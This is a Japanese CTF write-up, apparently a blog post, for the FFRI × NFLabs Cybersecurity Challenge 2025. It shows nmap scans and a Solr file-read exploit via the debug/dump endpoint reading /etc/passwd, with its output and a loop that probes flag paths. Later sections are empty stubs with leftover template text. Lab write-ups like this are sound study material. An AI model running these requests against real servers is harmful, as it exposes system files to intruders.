---
title: "FFRI × NFLabs. Cybersecurity Challenge 2025 Writeup & Upsolve"
date: "2025/09/15"
---

# FFRI × NFLabs. Cybersecurity Challenge 2025 Writeup

FFRI × NFLabs. Cybersecurity Challenge 2025に参加しており、13位でした。<br>
Top10にはせめて入りたいなと思いながらやっていました。悔しいです。
![ranking](/src/content/image/FFRI_NFLabs_ranking.png)

## Welcome [ 1/1 ]
### Welcome [175pt / 66 solves]
提出のみ
```
flag{Good_Luck_and_Have_Fun!}
```

## Pentest [ 3/7 ]
### HiddenService[255pt / 50 solves]
nmapを実行すると、22番ポートでsshと31337番ポートでApacheのサービスが動いていることが分かる。
```bash
$ nmap 10.0.129.138 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 16:51 JST
Nmap scan report for ip-10-0-129-138.ap-northeast-1.compute.internal (10.0.129.138)
Host is up (0.0017s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
31337/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds
```
31337番ポートにアクセスすると、Shellにアクセスできる。<br>
catやlsが実行できるため、flag.txtがあるディレクトリを探索するとflagをGET。
![Hidden_result](/src/content/image/Hidden_result.png)
```
flag{Ch4nging_th3_p0rt_is_p0intl3ss}
```
### Shell4Solr [455pt / 16 solves]
nmapを実行すると、80番ポートでApatch Solr、2222番ポートでsshが動いていることが分かる。
```bash
$ nmap 10.0.129.148 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 17:19 JST
Nmap scan report for ip-10-0-129-148.ap-northeast-1.compute.internal (10.0.129.148)
Host is up (0.0017s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache Solr
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
```
80番ポートにアクセスすると、Apatch Solrの管理画面が表示される。バージョンは8.11.0。問題文のヒントより、log4jの脆弱性がこのサイトには含まれているらしいので、この[Github](https://github.com/LucasPDiniz/CVE-2021-44228)を参考にlog4jのpocを検証した。payloadを送信するとnetcatで結果が返されることが分かったので、log4jの脆弱性を使うのは確定なのだろう
![alt text](image.png)
この[poc](https://github.com/mbechler/marshalsec)を検証しようとしたがJDK17でビルドしようとしていたため、java.base/java.langなどが開かず、うまく動かない。Dockerなどを用意して何とかビルドしようとしていたが、うまくいかず断念<br>
調査する上で、Logging画面(/~logging)にauthentication=disabled authorization=disabledと出ているのを発見。GPTを使いながら調べているとSolrには開発・デバッグ用途の DumpRequestHandler があり、ContentStreams（stream.*）をそのまま返す挙動があるらしく、管理系が認証なしで空いているのでデバッグ系も空いている可能性が高いと判断した。そのため`GET /solr/<core>/debug/dump?param=ContentStreams`というリクエストを送ると、レスポンスが返ってくるのかを確認。加えて`param=`という引数を与えているので、ここでLFIができるのかも一緒に検証
```bash
$ curl -s "http://10.0.129.128:80/solr/$CORE/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd"
```
```JSON
{
  "responseHeader": {
    "status": 0,
    "QTime": 7,
    "handler": "org.apache.solr.handler.DumpRequestHandler",
    "params": {
      "param": "ContentStreams",
      "stream.url": "file:///etc/passwd"
    }
  },
  "params": {
    "stream.url": "file:///etc/passwd",
    "echoHandler": "true",
    "param": "ContentStreams",
    "echoParams": "explicit"
  },
  "streams": [
    {
      "name": null,
      "sourceInfo": "url",
      "size": null,
      "contentType": null,
      "stream": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nsolr:x:1000:1000:Linux User,,,:/opt/solr:/bin/ash\n"
    }
  ],
  "context": {
    "webapp": "/solr",
    "path": "/debug/dump",
    "httpMethod": "GET"
  }
}

```
すると`file:///etc/passwd`の中身が返ってきて、LFI成功<br>
環境変数に`HOME=/opt/solr`, `PWD=/opt/solr/server`とあるため、ここから連想されるflag.txtがあるディレクトリに対してリクエストを送るとflagをゲットできた。(ログが長いので省略)
```bash
CORE=${CORE:-core0}
BASE="http://10.0.129.128:80/solr/$CORE/debug/dump?param=ContentStreams&stream.url=file://"

for p in \
  /etc/flag /etc/flag.txt \
  /opt/flag /opt/flag.txt \
  /var/flag /var/flag.txt \
  /opt/solr/flag /opt/solr/flag.txt \
  /opt/solr/server/flag /opt/solr/server/flag.txt \
  /opt/solr/server/solr/flag /opt/solr/server/solr/flag.txt \
  /var/solr/flag /var/solr/flag.txt \
  /run/secrets/flag /run/secrets/flag.txt /run/secrets/FLAG \
  /etc/motd /etc/issue /etc/hostname
do
  echo "=== $p"
  curl -s "${BASE}$p"
  echo
done
```
```JSON
{
  "responseHeader": {
    "status": 0,
    "QTime": 1,
    "handler": "org.apache.solr.handler.DumpRequestHandler",
    "params": {
      "param": "ContentStreams",
      "stream.url": "file:///opt/solr/server/flag.txt"
    }
  },
  "params": {
    "stream.url": "file:///opt/solr/server/flag.txt",
    "echoHandler": "true",
    "param": "ContentStreams",
    "echoParams": "explicit"
  },
  "streams": [
    {
      "name": null,
      "sourceInfo": "url",
      "size": null,
      "contentType": null,
      "stream": "flag{l0g4j_s0lr_r3vshell}"
    }
  ],
  "context": {
    "webapp": "/solr",
    "path": "/debug/dump",
    "httpMethod": "GET"
  }
}

```
```
flag{l0g4j_s0lr_r3vshell}
```
log4jのpocが使えないことが分かってから1時間くらい格闘してました。

## Web [ 3/4 ]
### Secure Web Company

## Malware Analysis [ 2/4 ]
### Downloader

## Binary [ 2/4 ]
### Abnormal

## Misc [ 3/4 ]
### Bellaso

```
// コードブロック例
const hello = () => {
  console.log("Hello, World!");
};
```

> 引用テキストの例です。

[リンクの例](https://example.com)

**太字**や*斜体*のテキストも使用できます。
